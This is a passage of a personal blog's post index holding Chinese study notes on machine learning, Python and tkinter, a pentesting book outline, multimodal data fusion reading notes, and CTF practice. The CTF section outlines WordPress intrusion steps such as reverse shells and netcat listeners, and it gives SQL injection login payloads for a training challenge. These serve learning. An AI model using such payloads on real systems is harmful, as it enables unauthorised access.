aria-hidden="true">image-20230211020052998</figcaption></figure></li></ul></li><li><p>代码解析<imgsrc="https://s2.loli.net/2023/02/11/CL36QefVP2u4lrp.png"alt="image-20230211014051560" /><imgsrc="https://s2.loli.net/2023/02/11/oKTUmi4GWtDfCI5.png"alt="img" /></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> Machine Learning </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Lab </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>多类特征</title>
      <link href="/2023/02/11/ml05/"/>
      <url>/2023/02/11/ml05/</url>
      
        <content type="html"><![CDATA[<h3 id="多类特征">多类特征</h3><ul><li><span class="math display">\[x^{(2)}是一个特征向量：表示第二个训练集上的所有特征集合\\x^{(2)}_3：表示第二个训练集的第三个特征\]</span></li></ul><p>​ <img src="https://s2.loli.net/2023/02/11/mCLsy7UfhX8n6eg.png"alt="image-20230210235940441" /></p><ul><li><span class="math display">\[多元线性回归：f_{\vec w,b}(\vec x)= \vec w * \vec x + b\]</span></li></ul><h3 id="向量化">向量化</h3><ul><li><p>python 实现向量的点积运算 <span class="math display">\[f_{\vec w,b}(\vec x)=( \sum _{j=1}^nw_jx_j)+b\]</span></p><pre class="language-python" data-language="python"><code class="language-python">f <span class="token operator">=</span> np<span class="token punctuation">.</span>dot<span class="token punctuation">(</span>w<span class="token punctuation">,</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> b<span class="token operator">//</span> 使用并行硬件的能力</code></pre><ul><li>此外它只需要一行代码</li></ul></li><li><p>向量化在计算机上的实现</p><ul><li>多核并行处理</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> Machine Learning </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Python</title>
      <link href="/2023/02/11/python/"/>
      <url>/2023/02/11/python/</url>
      
        <content type="html"><![CDATA[<h3 id="安装版本">安装、版本</h3><ul><li><p>kali python版本切换</p><ol type="1"><li><p>command</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> update-alternatives <span class="token parameter variable">--install</span> /usr/bin/python python /usr/bin/python2 <span class="token number">100</span>  <span class="token comment">#1</span><span class="token function">sudo</span> update-alternatives <span class="token parameter variable">--install</span> /usr/bin/python python /usr/bin/python3 <span class="token number">150</span>  <span class="token comment">#2</span>supdate-alternatives <span class="token parameter variable">--config</span> python<span class="token comment">#3</span></code></pre><p><strong>如下</strong>：<imgsrc="https://s2.loli.net/2023/05/24/JYuV6L3UAwH7mR1.png"alt="最终如下" /></p></li></ol></li><li><p><strong>指定版本下安装库</strong></p><pre class="language-powershell" data-language="powershell"><code class="language-powershell">pip3<span class="token punctuation">.</span>11 install requests</code></pre><figure><img src="https://s2.loli.net/2023/02/27/uy5mipCaBU9Te6c.png"alt="image-20230227142616765" /><figcaption aria-hidden="true">image-20230227142616765</figcaption></figure></li></ul><h3 id="图形编辑器">图形编辑器</h3><ul><li><p><strong>import</strong></p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> json<span class="token keyword">from</span> tkinter <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> tkinter <span class="token keyword">as</span> tk<span class="token keyword">from</span> tkinter <span class="token keyword">import</span> filedialog</code></pre><ul><li>This code imports several modules from the tkinter library:<code>Tk</code>, <code>Frame</code>, <code>Button</code>,<code>Label</code>, <code>Entry</code>, <code>Text</code>,<code>Scrollbar</code>, <code>Canvas</code>, and<code>filedialog</code>. It also imports the <code>json</code>module.</li><li><code>Tk</code> is the main window of the GUI application.<code>Frame</code> is a container widget used to organize other widgets.<code>Button</code> is used to create buttons, <code>Label</code> isused to create text labels, <code>Entry</code> is used to create textentry fields, <code>Text</code> is used to create multi-line textfields, <code>Scrollbar</code> is used to create scrollbars, and<code>Canvas</code> is used to create a drawing area.</li><li><code>filedialog</code> is a module that provides a file dialogwindow to allow the user to select a file or directory.</li></ul><pre class="language-python" data-language="python"><code class="language-python">self<span class="token punctuation">.</span>root <span class="token operator">=</span> Tk<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><ul><li>创建主窗口</li></ul></li><li><p><strong>如何理解canvas：</strong></p><blockquote><ol type="1"><li><p>Canvas是一个图形化的工具，它提供了绘制各种形状、文字、图像等的方法，并且可以将这些元素放在画布上进行展示。它是一个画布，可以用来显示和编辑图形，类似于画图板或者是图形界面程序中的绘图区域。</p></li><li><p>在Python中，Canvas通常是使用图形界面库（例如Tkinter、PyQt等）提供的组件之一，通过实例化Canvas对象，可以将其放置在图形界面的窗口中，并在上面绘制各种形状、文字、图像等元素，从而实现图形化的效果。</p></li><li><p>Canvas提供了一系列的绘制方法，例如create_rectangle、create_oval、create_polygon等，这些方法可以用来绘制矩形、圆形、多边形等形状，通过传递不同的参数来控制形状的大小、颜色、边框等属性。同时，Canvas还提供了一些其他的方法，例如bind方法，可以将事件与Canvas对象进行绑定，从而实现在Canvas上监听鼠标事件、键盘事件等的功能。</p></li></ol></blockquote></li><li><p><strong>self.canvas.pack()</strong></p><blockquote><p>是将Canvas对象添加到GUI界面中显示，使用<code>pack()</code>方法将其填充到容器中。该方法将Canvas作为其容器的子部件添加到窗口中并返回。该方法可选参数可以设置如何放置小部件。例如，<code>side</code>参数指定该小部件在其容器中放置的方向，如<code>LEFT</code>，<code>RIGHT</code>，<code>TOP</code>，<code>BOTTOM</code>。</p></blockquote></li><li><p>如果我不关闭这dialog，我<strong>无法关闭主窗口</strong></p><blockquote><p>这是因为你的主程序被阻塞了。在 tkinter中，主程序会进入一个事件循环<code>graphics_editor.root.mainloop()</code>，不断等待事件的发生。如果你创建了一个Toplevel 窗口，但是没有在该窗口中使用 <code>wait_window</code> 或者<code>grab_set</code>，那么该窗口会阻塞主程序的运行，导致主窗口无法响应关闭事件。</p></blockquote><ul><li><p><code>dialog.transient(self.root)</code>将对话框的父窗口设置为主窗口，这样可以使得对话框在主窗口上面显示，并且在主窗口被最小化或关闭时，对话框也会随之关闭。</p></li><li><p><code>dialog.wait_visibility()</code>等待对话框窗口显示，即等待其被成功创建并绘制。</p></li><li><p><code>dialog.grab_set()</code>将对话框设置为模态对话框，即其他窗口无法获得焦点和响应，只有对话框被关闭后才能继续操作其他窗口。</p></li><li><p><code>dialog.wait_window()</code>等待对话框被关闭，即阻塞程序继续执行，直到对话框被关闭。</p></li><li><p><code>dialog.grab_release()</code>取消对话框的模态设置，即恢复其他窗口的响应和焦点。</p></li><li><p><strong>Ans:</strong></p><pre class="language-python" data-language="python"><code class="language-python">dialog<span class="token punctuation">.</span>wait_window<span class="token punctuation">(</span><span class="token punctuation">)</span>dialog<span class="token punctuation">.</span>grab_release<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre></li></ul></li><li><p>创建界面需要以下方法：</p><ol type="1"><li>创建主窗口：可以使用 <code>Tk()</code> 或者 <code>Toplevel()</code>方法创建主窗口或子窗口。</li><li>添加组件：可以使用 <code>Label()</code>, <code>Button()</code>,<code>Entry()</code>, <code>Text()</code>, <code>Canvas()</code>等方法添加组件。</li><li>布局管理器：可以使用 <code>pack()</code>, <code>grid()</code>,<code>place()</code> 等方法对组件进行布局管理。</li><li>绑定事件：可以使用 <code>bind()</code>方法绑定事件，如鼠标点击、键盘按键等。</li><li>运行界面：使用 <code>mainloop()</code>方法运行界面，使界面持续运行，响应用户事件。</li></ol></li></ul><h3 id="语法">语法</h3><ul><li><p>多函数执行</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  db<span class="token punctuation">(</span>url<span class="token punctuation">)</span>  table<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>  main<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre></li><li><p>四种集合类型</p><ul><li>List[]：有序可更改</li><li>Turple()：有序不可更改</li><li>Set{}：无序，无索引</li><li>Dictionary{}：无序，可变，有索引</li></ul></li><li><p>python 注释<imgsrc="https://s2.loli.net/2023/02/11/Q4GZh8SHzpkmOUr.png"alt="image-20230211005557567" /></p></li></ul><ol type="1"><li><div class="sourceCode" id="cb1"><preclass="sourceCode python"><code class="sourceCode python"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a>   my_tuple <span class="op">=</span> (<span class="dv">1</span>, <span class="dv">2</span>, <span class="dv">3</span>, <span class="dv">4</span>, <span class="dv">5</span>)</span><span id="cb1-2"><a href="#cb1-2" aria-hidden="true" tabindex="-1"></a>   result <span class="op">=</span> my_tuple[<span class="dv">1</span>:<span class="dv">4</span>:<span class="dv">2</span>]</span><span id="cb1-3"><a href="#cb1-3" aria-hidden="true" tabindex="-1"></a>   <span class="bu">print</span>(result)</span></code></pre></div><p>解析：这段代码定义了一个元组my_tuple,然后使用切片操作获取一个切片赋值给result,最后打印result。</p><p>my_tuple = (1, 2, 3, 4, 5) 定义一个包含5个元素的元组</p><p>result = my_tuple[1:4:2]对my_tuple进行<strong>切片操作</strong>,具体参数是:</p><ul><li><p>1:4 表示开始和结束索引为1和4</p></li><li><p>:2 表示<strong>步长</strong>为2</p></li></ul><p>所以这段切片的意思是:</p><p>从索引1开始,到索引4结束(不包括4),每隔2个元素取一个。</p><p>最终result的值为:(2, 4)</p><p>print(result) 打印出result的值</p><p>所以整段代码的输出<strong>结果</strong>是:</p><p>(2, 4)</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> Programming Design </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>The Pentester Blueprint</title>
      <link href="/2023/02/09/the-pentester-blueprint/"/>
      <url>/2023/02/09/the-pentester-blueprint/</url>
      
        <content type="html"><![CDATA[<h3 id="须知">须知</h3><blockquote><p>这是一本导论书籍、不含有任何技术教学</p></blockquote><h3 id="introduction">INTRODUCTION</h3><ul><li>read team</li><li>blue team</li><li>OWASP：industry standard</li><li>some commom vulnerbility scanners:<ul><li>Nessus</li><li>Nexpose</li><li>Openvas</li><li>Qualys</li></ul></li><li>pentest target<ul><li>Generalist (network, Wi-Fi, and light web app)</li><li>Application (web app, mobile, thick client, and cloud)</li><li>Internet of Things (IoT)</li><li>Industrial Control Systems (ICS)</li><li>Hardware (including medical devices)</li><li>Social engineering (people)</li><li>Physical (buildings)</li><li>Transportation (vehicles, airplanes)</li><li>Red team (adversarial simulation)</li></ul></li></ul><h3 id="prerequisite-skillls">PREREQUISITE SKILLLS</h3><ul><li>OS<ul><li>active directory(AD)</li></ul></li><li>Networking</li><li>Malware<ul><li>Fileless Malware</li><li>Viruses</li><li>Worms</li><li>Ransomware</li><li>Cryptominers</li><li>Botnets</li><li>Spyware</li><li>Trojans</li><li>Rootkits</li><li>Module malware</li></ul></li><li>Advanced Persistent Threats</li><li>The Cyber Kill Chain<ul><li>Reconnaissance</li><li>Weaponization:</li><li>Delivery</li><li>Exploitation</li><li>Installation</li><li>Command and Control</li><li>Actions on Objectives</li></ul></li><li>Common Vulnerabilities and Exposures<ul><li>CVE database</li></ul></li><li>Phishing and Other Social Engineering<ul><li>Kevin Mitnick</li></ul></li><li>Airgapped Machines</li><li>The Dark Web<ul><li>Tor</li><li>I2p</li></ul></li><li>CompTIA 认证</li><li>CIA</li></ul><h3 id="educationn-of-a-hacker">Educationn of a Hacker</h3><ul><li><p>Technology knowledge</p></li><li><p>Hacking Knowledge</p></li><li><p>Hacking mindest</p></li><li><p>Network</p><ul><li><p>Personal Area Network</p></li><li><p>Metropolitan Area Network</p></li></ul></li><li><p>Physical security</p></li><li><p>White paper</p></li></ul><h3 id="education-resource">Education Resource</h3><ul><li>books<ul><li>Penetration Testing: A Hands-on Introduction to Hacking (No StarchPress, 2014)</li><li>Penetration Testing for Dummies (For Dummies Press, 2020)</li><li>Penetration Testing Essentials (Jones &amp; Bartlett Learning,2015)</li><li>The Hacker Playbook: Practical Guide to Penetration Testing Series(CreateSpace Independent Publishing Platform, 2015)</li><li>Penetration Testing: Security Analysis (Cengage Learning, 2010)</li><li>Unauthorised Access: Physical Penetration Testing for IT SecurityTeams (Wiley, 2009)</li></ul></li></ul><h3 id="hacking-system">Hacking System</h3><ul><li>wls</li><li>kali</li><li>Popular testing tools<ul><li>kali</li><li>Metasploit Framework, Nessus, and OpenVAS</li><li>Hak5</li><li>PentestBox</li><li>vulnhub</li></ul></li><li></li></ul>]]></content>
      
      
      <categories>
          
          <category> Cybersecurity </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>多模态空管大数据属性融合与表征</title>
      <link href="/2023/02/03/duo-mo-tai-kong-guan-da-shu-ju-shu-xing-rong-he-yu-biao-zheng/"/>
      <url>/2023/02/03/duo-mo-tai-kong-guan-da-shu-ju-shu-xing-rong-he-yu-biao-zheng/</url>
      
        <content type="html"><![CDATA[<h3 id="资料收集">资料收集</h3><ul><li>关键词：<strong>多模态、空管、大数据、融合与表征</strong>（航空、空管）<ul><li><ahref="https://kreader.cnki.net/Kreader/CatalogViewPage.aspx?dbCode=cdmd&amp;filename=1020337856.nh&amp;tablename=CMFD202101&amp;compose=&amp;first=1&amp;uid=WEEvREcwSlJHSldSdmVpa3VEMHZFeFZHUGJSanBwcWlNcmwyNm1xMys1MD0=$9A4hF_YAuvQ5obgVAqNKPCYcEjKensW4ggI8Fm4gTkoUKaID8j8gFw!!">航空旅客的多模态情感识别算法研究</a></li><li><ahref="https://kreader.cnki.net/Kreader/CatalogViewPage.aspx?dbCode=cdmd&amp;filename=1016062688.nh&amp;tablename=CMFD201602&amp;compose=&amp;first=1&amp;uid=WEEvREcwSlJHSldSdmVpa3VEMHZFeFZHUGJSanBwcWlNcmwyNm1xMys1MD0=$9A4hF_YAuvQ5obgVAqNKPCYcEjKensW4ggI8Fm4gTkoUKaID8j8gFw!!">空管多传感器数据融合的研究与实现</a></li><li><ahref="https://kns.cnki.net/kcms2/article/abstract?v=3uoqIhG8C475KOm_zrgu4lQARvep2SAkWGEmc0QetxDh64Dt3veMp5_SF4x_qWQq8EAluiRwLXVCBBPfy9bFiKVL1LAAdfIW&amp;uniplatform=NZKPT">基于航班数据融合处理的民航清算空管数据采集系统设计与实现</a></li><li><ahref="https://kns.cnki.net/kcms2/article/abstract?v=inVe5WWz2m7-jQTUiU-Y2-abhBh46sR8gINlz5z-GaDmLGHjVNgOsWF4k3cRonyRAVnjTK3XCZdqqvbqrEF_ha7qDc_q75pRJMe7lRi2-NdesKhSXDznxg==&amp;uniplatform=NZKPT">基于语义的民航收益系统多源异构数据融合方法研究</a></li><li><ahref="https://kns.cnki.net/kcms2/article/abstract?v=inVe5WWz2m4KdGh2SB7YWTCPbUkS4G-PXPMWBOu3EdRKkk0aJw-X593j2R3uz3Rr_d2O9boFMUxUZuhh-kQM0SfU4Hk4GCjEb-Dom6Xd7N67dIC_wXEiaA==&amp;uniplatform=NZKPT">基于多源数据融合的4D航迹规划技术研究</a></li><li><ahref="https://kns.cnki.net/KXReader/Detail?invoice=JYUyfJ11vSc%2FZkRDKB1ns1c5%2Bn86wdOm2WsLChji3upLku77yBJIzd0jLVUiHzjvqckGNNQBw5Hb0UT6pybrtPzYGx2brOFFy1YiD%2F1TD9wPsOorvlF%2BmpRPxifsKw5bagrrsvtuwmi1f1jN2cHzmSWAUY89rOj%2B%2FanpCBrWylA%3D&amp;DBCODE=CJFD&amp;FileName=CXKJ201803018&amp;TABLEName=cjfdlast2018&amp;nonce=60CD07ACCEB24A618028186527D553D9&amp;uid=&amp;TIMESTAMP=1675351552665">基于信息融合的空管大数据构建路径研究</a></li><li><ahref="https://kns.cnki.net/KXReader/Detail?invoice=h87qxJZT57CcpW1kP5E6y1qA%2BhStGxUPRujJbyy79RoW0sh7X5vN1OTyB82uCO7tgzl%2BK7rYm7pyVBU%2FTnDRW0wtCin68u7kqutMkSeKWsxBtBHrUUmMbD%2FF%2BNse76U95VKavFOWAF8IJWZ9%2BU6zRhT3ugGKEfVDfhoFdvgu20s%3D&amp;DBCODE=CJFD&amp;FileName=MHFX201506005&amp;TABLEName=cjfdlast2015&amp;nonce=CA6E2D7ADC80480F94C2E58C30B9E2BD&amp;uid=&amp;TIMESTAMP=1675351717857">空管大数据的概念、特征和应用</a></li></ul></li><li>博客<ul><li><ahref="https://zhuanlan.zhihu.com/p/142455144">多模态学习方法综述</a></li><li><ahref="https://mp.weixin.qq.com/s/r95blN2q9OAr7wUfJBxTNQ">多模态预训练模型综述</a>（论文举例：公式、图表）</li><li><ahref="https://zhuanlan.zhihu.com/p/355441763">多模态数据融合算法研究_阅读笔记</a></li><li><ahref="https://imzhanghao.com/2022/10/27/multimodal-learning/">多模态学习</a>（附多篇参考文献）</li><li><ahref="https://zhuanlan.zhihu.com/p/389287751?utm_campaign=shareopn&amp;utm_medium=social&amp;utm_oi=27272153137152&amp;utm_psn=1572265674642264064&amp;utm_source=wechat_session">多模态学习综述及最新方向</a></li><li><a href="https://zhuanlan.zhihu.com/p/543537800">CMU-10707第二十一讲 多模态机器学习</a>（附多篇参考文献，多数是英文）</li></ul></li><li>论文（含综述）<ul><li><ahref="http://cje.ustb.edu.cn/cn/article/doi/10.13374/j.issn2095-9389.2019.03.21.003">多模态学习方法综述</a>（比较全面）</li><li><ahref="https://kreader.cnki.net/Kreader/CatalogViewPage.aspx?dbCode=cdmd&amp;filename=1018045520.nh&amp;tablename=CDFDLAST2018&amp;compose=&amp;first=1&amp;uid=WEEvREcwSlJHSldSdmVpa3VEMHZFeFZHUGJSanBwcWlNcmwyNm1xMys1MD0=$9A4hF_YAuvQ5obgVAqNKPCYcEjKensW4ggI8Fm4gTkoUKaID8j8gFw!!">多模态数据融合算法研究</a>（大连理工大学博士论文）</li></ul></li></ul><h3 id="多模态学习方法综述"><ahref="https://zhuanlan.zhihu.com/p/142455144">多模态学习方法综述</a></h3><ul><li><h4 id="多模态数据"><strong>多模态数据：</strong></h4><ul><li>从<strong>语义感知</strong>的角度切入，多模态数据涉及不同的感知通道如视觉、听觉、触觉、嗅觉所接收到的信息；</li><li>在<strong>数据层面</strong>理解，多模态数据则可被看作多种数据类型的组合，如图片、数值、文本、符号、音频、时间序列，或者集合、树、图等不同数据结构所组成的复合数据形式，乃至来自不同数据库、不同知识库的各种信息资源的组合</li></ul></li><li><h4id="多模态可能有以下三种形式">多模态可能有以下<strong>三种形式</strong>。</h4><ul><li><strong>描述同一对象的多媒体数据</strong>。如互联网环境下描述某一特定对象的视频、图片、语音、文本等信息。图 1 即为典型的多模态信息形式。</li><li><strong>来自不同传感器的同一类媒体数据</strong>。如医学影像学中不同的检查设备所产生的图像数据，包括B超（B-Scanultrasonography）、计算机断层扫描（CT）、核磁共振等；物联网背景下不同传感器所检测到的同一对象数据等。</li><li><strong>具有不同的数据结构特点、表示形式的表意符号与信息</strong>。如描述同一对象的结构化、非结构化的数据单元；描述同一数学概念的公式、逻辑符号、函数图及解释性文本；描述同一语义的词向量、词袋、知识图谱以及其它语义符号单元等[5]。</li></ul></li><li><h4 id="多模态信息融合"><strong>多模态信息融合：</strong></h4><ul><li>多模态融合要求对多源数据进行综合有效地筛选和利用，实现集成化感知与决策的目的，常见的信息融合方式有物理层融合、特征层融合、决策层融合几个类型。</li><li><strong>物理层</strong>融合指在感知的第一阶段，在传感器层级对采集到的数据进行融合处理，这种处理方式可被概括为多传感器信息融合（Multi-sensor informationfusion），是工业生产场景中极为常见的信息融合方法；</li><li><strong>特征层</strong>融合指在特征抽取和表达的层级对信息进行融合，如对同一场景中不容摄像头采集到的图像采用相同的特征表达形式，进而进行相应的叠加计算；</li><li><strong>决策层</strong>融合指对不同模态的感知模型所输出的结果进行融合，这种融合方式具有较好的抗干扰性能，对于传感器性能和种类要求相对不高，但具有较大的信息损耗</li></ul></li><li><h4 id="结论与展望"><strong>结论与展望</strong></h4><ul><li><p>大数据背景下，多模态数据对同一对象的描述存在形式多源异构、内在语义一致的特点。不同的模态形式分别描述对象在某一特定角度下的特征。随着机器学习技术的发展，多模态学习领域的研究热点逐渐从经典的<strong>统计学习方法转移到深度学习方法</strong>。对于视觉模态，CNN逐渐成为最有效的特征表示方法；对于文本模态及相关、类似的序列预测任务，LSTM也逐渐取代概率图模型，取得主导地位。而对抗学习的兴起使得跨模态任务更为多样化。</p></li><li><p>对于多模态学习方法的研究可以从以下几个方向进一步展开：</p><ul><li><strong>(1)</strong>对不同模态的样本进行更为精细化的特征表示，实现有效的跨模态匹配，利用模态互补构建更为完整的特征描述体系；</li><li><strong>(2)</strong>克服学习样本数量的限制，研究弱监督、无监督的多模态学习方法；针对该问题，对抗学习方法是可行的解决方案之一；</li><li><strong>(3)</strong>研究有效的模型融合框架，一方面是组合不同的算法以取得高质量的数据分析结果，另一方面是用模型融合指导对多模态数据的融合；</li><li><strong>(4)</strong>研究效果更为真实、性能更加稳定的跨模态生成方法；(5)应用背景从通用领域向垂直领域拓展，针对特定的应用场景（如医疗场景）实现可行的解决方案。</li></ul></li></ul></li></ul><hr /><h3 id="多模态学习"><ahref="https://imzhanghao.com/2022/10/27/multimodal-learning/">多模态学习</a></h3><ul><li><h4id="表征representation如何挖掘模态间的互补性或独立性以表征多模态数据"><strong>表征Representation</strong>：如何挖掘模态间的互补性或独立性以表征多模态数据</h4><ul><li><p>第一个基本挑战是学习如何以<strong>利用多种模态的互补性和冗余性的方式表示和总结多模态数据</strong>。多模态数据的异质性使得构建这样的表示具有挑战性。例如，语言通常是象征性的，而音频和视觉形式将被表示为信号。</p></li><li><p><strong>单模态的表征</strong>负责将信息表示为计算机可以处理的数值向量或者进一步抽象为更高层的特征向量，而<strong>多模态表征</strong>是指通过利用多模态之间的互补性，剔除模态间的冗余性，从而学习到更好的特征表示</p></li><li><p><strong>联合表征</strong></p></li><li><h5 id="协同表征">协同表征</h5></li></ul></li><li><h4 id="融合fusion">融合Fusion</h4><ul><li><strong>模型无关的方法</strong><ul><li>早期融合</li><li>晚期融合</li><li>混合融合</li></ul></li><li><strong>基于模型的方法</strong><ul><li><strong>Deep NeuralNetworks</strong>：神经网络进行端到端的训练，使用LSTM、卷积层、注意力层、门机制、双线性融合等设计序列数据或图像数据的复杂交互。</li><li><strong>Multiple Kernellearning</strong>：多核学习（将不同的核用于不同的数据模态/视图）</li><li><strong>Graphicalmodels</strong>：利用隐马尔可夫模型或贝叶斯网络建模数据的联合概率分布(生成式)或条件概率(判别式)</li></ul></li></ul></li></ul><hr /><h3 id="多模态预训练模型综述论文举例公式图表"><ahref="https://mp.weixin.qq.com/s/r95blN2q9OAr7wUfJBxTNQ">多模态预训练模型综述</a>（论文举例：公式、图表）</h3><ul><li>特征融合：<ul><li>目前的<strong>主流</strong>的做法不外乎两种即双流two-stream或者单流single-stream；<strong>前者</strong>基本上就是双塔网络，然后在模型最后的时候设计一些layer进行交互，所以双流结构的交互发生的时间更晚。<strong>后者</strong>就是一个网络比如transformer，其从一开始就进入一个网络进行交互，所以单流结构的交互时间发生的更早且全程发生，更灵活；当然还有一类是<strong>Multi-stream</strong>(MMFT-BERT)，目前还不多，不排除将来出现基于图文音等Multi-stream多模态模型</li></ul></li></ul><hr /><h3 id="多模态数据融合算法研究_阅读笔记图文公式"><ahref="https://zhuanlan.zhihu.com/p/355441763">多模态数据融合算法研究_阅读笔记</a>（图文、公式）</h3><ul><li>面向不完整多模态数据分析的融合</li><li>面向增量多模态数据聚类的融合</li><li>面向异构模态数据迁移的融合</li><li>面向多模态数据低维共享的融合</li></ul>]]></content>
      
      
      <categories>
          
          <category> Cybersecurity </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Academic </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF赛事</title>
      <link href="/2023/01/31/ctf/"/>
      <url>/2023/01/31/ctf/</url>
      
        <content type="html"><![CDATA[<h3 id="ctf竞赛内容">CTF竞赛内容</h3><p><a href="https://ctf-wiki.org/">CTF-wiki</a></p><p>由于 CTF的考题范围其实比较宽广，目前也没有太明确的规定界限说会考哪些内容。但是就目前的比赛题型而言的话，主要还是依据常见的<strong>Web 网络攻防、RE 逆向工程、Pwn 二进制漏洞利用、Crypto密码攻击、Mobile 移动安全</strong> 以及 <strong>Misc 安全杂项</strong>来进行分类。</p><ul><li><p><strong>Web - 网络攻防</strong></p><p>主要介绍了 Web 安全中常见的漏洞，如 SQL注入、XSS、CSRF、文件包含、文件上传、代码审计、PHP 弱类型等，Web安全中常见的题型及解题思路，并提供了一些常用的工具。</p></li><li><p><strong>Reverse Engineering - 逆向工程</strong></p><p>主要介绍了逆向工程中的常见题型、工具平台、解题思路，进阶部分介绍了逆向工程中常见的软件保护、反编译、反调试、加壳脱壳技术。</p></li><li><p><strong>Pwn - 二进制漏洞利用</strong></p><p>Pwn题目主要考察二进制漏洞的发掘和利用，需要对计算机操作系统底层有一定的了解。在CTF 竞赛中，PWN 题目主要出现在 Linux 平台上。</p></li><li><p><strong>Crypto - 密码攻击</strong></p><p>主要包括古典密码学和现代密码学两部分内容，古典密码学趣味性强，种类繁多，现代密码学安全性高，对算法理解的要求较高。</p></li><li><p><strong>Mobile - 移动安全</strong></p><p>主要介绍了安卓逆向中的常用工具和主要问题类型，安卓逆向常常需要一定的安卓开发知识，iOS逆向题目在 CTF 竞赛中较少出现，因此不作过多介绍。</p></li><li><p><strong>Misc - 安全杂项</strong></p><p>以诸葛建伟翻译的《线上幽灵：世界头号黑客米特尼克自传》和一些典型 MISC题为切入点，内容主要包括信息搜集、编码分析、取证分析、隐写分析等。</p></li></ul><h3 id="全国大学生信息安全竞赛---竞赛内容">全国大学生信息安全竞赛 -竞赛内容 <ahref="https://ctf-wiki.org/introduction/content/#-">¶</a></h3><p>2016 年全国大学生信息安全竞赛开始举办创新实践技能赛，采取的就是传统的CTF 赛制。在《2016年全国大学生信息安全竞赛参赛指南》中主办方给出的竞赛内容相对全面，值得参考。</p><ol type="1"><li><strong>系统安全</strong>。涉及操作系统和 Web 系统安全，包括 Web网站多种语言源代码审计分析（特别是 PHP）、数据库管理和 SQL 操作、Web漏洞挖掘和利用（如 SQL 注入和XSS）、服务器提权、编写代码补丁并修复网站漏洞等安全技能。</li><li><strong>软件逆向</strong>。涉及 Windows/Linux/Android平台的多种编程技术，要求利用常用工具对源代码及二进制文件进行逆向分析，掌握Android 移动应用 APK文件的逆向分析，掌握加解密、内核编程、算法、反调试和代码混淆技术。</li><li><strong>漏洞挖掘和利用</strong>。掌握 C/C++/Python/PHP/Java/Ruby /汇编 等语言，挖掘 Windows/Linux（x86/x86_64平台）二进制程序漏洞，掌握缓冲区溢出和格式化字符串攻击，编写并利用shellcode。</li><li><strong>密码学原理及应用</strong>。掌握古典密码学和现代密码学，分析密码算法和协议，计算密钥和进行加解密操作。</li><li><strong>其他内容。</strong>包括信息搜集能力，编程能力、移动安全、云端计算安全、可信计算、自主可控、隐写术和信息隐藏、计算机取证（Forensics）技术和文件恢复技能，计算机网络基础以及对网络流量的分析能力。</li></ol><h3 id="b站视频教程">B站视频教程</h3><p><ahref="https://www.bilibili.com/video/BV19S4y1S7o2/?spm_id_from=333.337.search-card.all.click&amp;vd_source=03c4adad8a71f5349bd0c6db2d174203">b站</a></p><figure><img src="https://s2.loli.net/2023/02/13/e5I2KnVHDXC9gAR.png"alt="image-20230130120348960" /><figcaption aria-hidden="true">image-20230130120348960</figcaption></figure><h4 id="wordpress入侵">Wordpress入侵</h4><ul><li>信息收集<ul><li>主机扫描<ul><li>arp-scan</li></ul></li><li>端口扫描:对应服务<ul><li>nmap</li></ul></li><li>爆破工具</li><li>wappalyzer 浏览器插件（获得网站应用信息）</li><li>目录扫描<ul><li>dirb</li><li>dirbuster</li><li>御剑</li><li>phpmyadmin 爆破工具</li><li>burp爆破</li></ul></li></ul></li><li>漏洞挖掘</li><li>漏洞利用<ul><li>生成shell</li><li>Msf生成反弹shell</li><li>kali linux 自带反弹shell</li><li><figure><img src="https://s2.loli.net/2023/02/13/UKtMyr3bIJPGoxq.png"alt="image-20230213061421732" /><figcaption aria-hidden="true">image-20230213061421732</figcaption></figure></li><li>netcat 监听端口</li></ul></li><li>权限提升</li></ul><h3 id="工具">工具</h3><ul><li>扩展 wappalyzer</li><li><figure><img src="https://s2.loli.net/2023/02/14/kcIlL3o8Tnu2Aym.png"alt="image-20230130151235784" /><figcaption aria-hidden="true">image-20230130151235784</figcaption></figure></li><li>burpSuite</li><li>蚁剑</li></ul><h3 id="书籍">书籍</h3><ul><li><ahref="https://www.linkedin.com/pulse/top-10-penetration-testing-books-beginnersand-more-mic-merritt/">top10 pennetraion testing books</a></li></ul><h3 id="博客项目">博客、项目</h3><ul><li><ahref="https://github.com/RESETHACKER-COMMUNITY/Pentesting-Bugbounty">渗透</a></li><li><ahref="https://ctf101.org/web-exploitation/overview/">CTF101</a></li></ul><h3 id="ctf实战">CTF实战</h3><p><a href="https://ctf.show/challenges#web2-7">CTF-show</a></p><p><ahref="https://blog.csdn.net/qq_45655564/article/details/119327905">writeup</a></p><h4 id="web1base64-注释解码image-20230213080908941">web1：base64注释解码<img src="https://s2.loli.net/2023/02/13/FuXGILQP2lq3NsU.png"alt="image-20230213080908941" /></h4><h4 id="web2sql注入">web2:sql注入</h4><ul><li><p>地址栏是<code>get</code>传参</p></li><li><p>sql注入post传参</p></li><li><p>成功sql注入，可以回显</p><pre class="language-markup" data-language="markup"><code class="language-markup">username=admin' or 1=1 order by 4# &amp;password=123456username=admin' or 1=1 order by 3# &amp;password=123456</code></pre></li><li><p>select 